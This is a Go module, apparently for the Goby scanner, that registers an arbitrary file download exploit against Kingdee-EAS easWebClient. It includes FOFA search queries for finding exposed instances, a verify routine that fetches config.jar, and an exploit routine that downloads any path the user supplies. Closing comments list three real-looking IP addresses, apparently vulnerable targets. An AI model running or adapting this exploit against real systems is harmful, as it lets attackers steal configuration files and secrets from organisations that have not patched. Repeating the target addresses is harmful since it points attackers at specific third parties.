package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kingdee-EAS easWebClient Arbitrary File Download Vulnerability",
    "Description": "<p>Kingdee-EAS is a leading enterprise management system, which helps enterprises to build an integrated platform for industry, treasury, tax and invoice files, covering human resource management, tax management, financial sharing, procurement management, inventory management, production and manufacturing, etc.</p><p>There is an arbitrary file reading vulnerability in Kingdee-EAS easWebClient, and attackers can read sensitive configuration file information such as config.jar.</p>",
    "Product": "Kingdee-EAS",
    "Homepage": "http://www.kingdee.com/",
    "DisclosureDate": "2023-02-14",
    "Author": "h1ei1",
    "FofaQuery": "body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\")",
    "GobyQuery": "body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\")",
    "Level": "2",
    "Impact": "<p>There is an arbitrary file reading vulnerability in Kingdee-EAS easWebClient, and attackers can read sensitive configuration file information such as config.jar.</p>",
    "Recommendation": "<p>Currently the manufacturer has released security patches, please update in time: <a href=\"http://www.kingdee.com/.\">http://www.kingdee.com/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "/bin/config.jar,/bin/lib/config.jar",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "金蝶-EAS easWebClient 任意文件下载漏洞",
            "Product": "Kingdee-EAS",
            "Description": "<p>金蝶-EAS是领先的企业管理系统，帮助企业构筑业财资税票档一体化平台，涵盖人力资源管理,税务管理、财务共享、采购管理、库存管理、生产制造等内容。<br></p><p>金蝶-EAS easWebClient 存在任意文件读取漏洞，攻击者可读取config.jar等敏感配置文件信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时更新：<a href=\"http://www.kingdee.com/\">http://www.kingdee.com/</a>。<br></p>",
            "Impact": "<p>金蝶-EAS easWebClient 存在任意文件读取漏洞，攻击者可读取config.jar等敏感配置文件信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Kingdee-EAS easWebClient Arbitrary File Download Vulnerability",
            "Product": "Kingdee-EAS",
            "Description": "<p>Kingdee-EAS is a leading enterprise management system, which helps enterprises to build an integrated platform for industry, treasury, tax and invoice files, covering human resource management, tax management, financial sharing, procurement management, inventory management, production and manufacturing, etc.<br></p><p>There is an arbitrary file reading vulnerability in Kingdee-EAS easWebClient, and attackers can read sensitive configuration file information such as config.jar.<br></p>",
            "Recommendation": "<p>Currently the manufacturer has released security patches, please update in time: <a href=\"http://www.kingdee.com/.\">http://www.kingdee.com/.</a><br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in Kingdee-EAS easWebClient, and attackers can read sensitive configuration file information such as config.jar.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10805"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/easWebClient/bin/config.jar"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "META-INF/MANIFEST.MF") {
					return true
				}
			}
			uri2 := "/easWebClient/bin/lib/config.jar"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "META-INF/MANIFEST.MF") {
					return true
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filePath"].(string)
			uri := "/easWebClient" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				expResult.Output = "文件路径：" + expResult.HostInfo.FixedHostInfo + uri + "\n\n\n\n"
				expResult.Success = true
			}
			return expResult
		},
	))
}

//47.103.27.56
//218.5.173.202:8008
//http://218.22.182.38:8088